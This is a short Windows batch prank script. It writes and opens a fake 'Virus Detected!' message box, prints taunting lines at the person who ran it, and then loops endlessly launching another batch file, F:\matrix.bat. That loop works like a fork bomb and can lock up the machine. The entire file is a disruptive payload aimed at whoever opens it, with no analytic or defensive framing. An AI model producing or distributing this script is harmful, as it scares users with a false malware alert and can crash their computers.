@echo off
echo x=msgbox("Virus Detected!" ,0, "Warning")>> msgbox.vbs
start msgbox.vbs
echo Why did you open this?
echo The title told you not to open it.
echo Oh well, have fun!
pause
:x
start F:\matrix.bat
goto x